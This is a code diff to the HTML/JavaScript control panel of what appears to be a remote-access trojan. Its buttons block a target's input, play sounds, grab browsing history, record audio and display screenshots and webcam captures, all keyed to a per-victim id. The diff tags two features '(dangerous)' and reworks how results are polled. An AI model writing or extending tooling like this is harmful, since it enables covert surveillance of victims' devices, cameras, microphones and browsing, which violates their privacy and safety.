@@ -44,7 +44,7 @@
         <button onclick="block_input()">block</button>
     </form>
     <br>
-    <b>psound</b>
+    <b>psound (dangerous)</b>
     <form>
         <input type="file" id="psound">
         <br>
@@ -70,7 +70,7 @@
     <b>ghistory</b><br>
     <button onclick="grab_history()">grab history</button>
     <br><br>
-    <b>raudio</b>
+    <b>raudio (dangerous)</b>
     <form>
         <input type="number" id="raudio" placeholder="duration (s)">
         <button onclick="record_audio()">record</button>
@@ -131,14 +131,13 @@
             output_list.innerHTML = "";
             fetch("/clear_output/?u={{ u }}");
         }
-        seen_ids = new Set();
+        last_id = ""
         function update_output() {
-            fetch("/get_output/?u={{ u }}").then(response => response.json())
+            fetch("/get_output/?u={{ u }}&last=" + last_id).then(response => response.json())
             .then(data => {
                 let output_list = document.querySelector("#output");
                 for (let instruction_id in data) {
-                    if (seen_ids.has(instruction_id)) continue;
-                    seen_ids.add(instruction_id);
+                    last_id = instruction_id;
                     let output_elem;
                     if (data[instruction_id][0] == "ss" || data[instruction_id][0] == "webcam") {
                         output_elem = document.createElement("img");
@@ -154,7 +153,6 @@
                         output_elem.textContent = data[instruction_id][1];
                     }
                     output_list.appendChild(output_elem);
-                    // decide how to properly display in the future
                 }
             });
         }
